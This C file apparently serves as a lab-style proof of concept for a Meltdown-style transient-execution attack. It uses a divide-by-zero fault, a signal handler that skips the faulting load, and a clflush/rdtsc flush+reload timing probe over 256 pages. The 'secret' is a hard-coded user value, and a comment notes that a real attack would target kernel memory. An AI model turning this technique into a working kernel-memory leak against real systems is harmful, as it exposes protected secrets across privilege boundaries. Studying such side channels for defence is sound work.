#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <sys/types.h>
#include <sys/wait.h>

extern char stop[];

struct sigaction myact;
unsigned long probe(char *adrs);    // flush+reload
void cf(char *a);
void my_handler(int sig, siginfo_t *siginfo, void *context)
{
    ucontext_t *ucontext = context;
    ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stop;
    return;
}
static inline void func(void *p)
{
    asm __volatile__
        (
         "  1:                  \n"
         "  .rept 300           \n"
         "  add $0x123, %%eax   \n"
         "  .endr               \n"
         "  mov $0x1, %%eax     \n"
         "  mov $0x0, %%edx     \n"
         "  divl %%edx          \n"
         "  movq (%0), %%rcx    \n"
         "  stop:               \n"
         "  nop                 \n"
         :
         :  "r" (p)
         :  "rax", "rdx", "rcx"
        );
}
int main(void)
{
    char arr[256 * 4096];
    int data = 210; // just a random number
                    // this will be kernel memory value like *0xffffffff80000000 or something
    int status;
    unsigned long time[256];
    pid_t pid;
    int zero = 0;

    myact.sa_sigaction = my_handler;
    myact.sa_flags |= SA_SIGINFO;
    sigaction(SIGFPE, &myact, NULL);
    memset(arr, 0xab, sizeof(arr));
    for (int i = 0; i < 256; i++)
    {
        for (int j = 0; j < 256; j++)
        {
            cf(arr + j * 4096);
        }
        func(arr + data * 4096);
        time[i] = probe(&arr[i * 4096]);
    }
    for (int i = 0; i < 256; i++)
    {
        printf("i = %d : %ld cycles\n", i, time[i]);
    }
    return 0;
}
unsigned long probe(char *adrs)
{
    volatile unsigned long time;

    asm __volatile__
        (
         "  mfence              \n"
         "  lfence              \n"
         "  rdtsc               \n"
         "  lfence              \n"
         "  movl %%eax, %%esi   \n"
         "  movl (%1), %%eax    \n"
         "  lfence              \n"
         "  rdtsc               \n"
         "  subl %%esi, %%eax   \n"
         "  clflush 0(%1)       \n"
         :  "=a" (time)
         :  "c" (adrs)
         :  "esi", "edx"
        );
    return time;
}
void cf(char *a)
{
    asm __volatile__
        (
         "  clflush 0(%0)       \n"
         :
         :  "c" (a)
        );
}
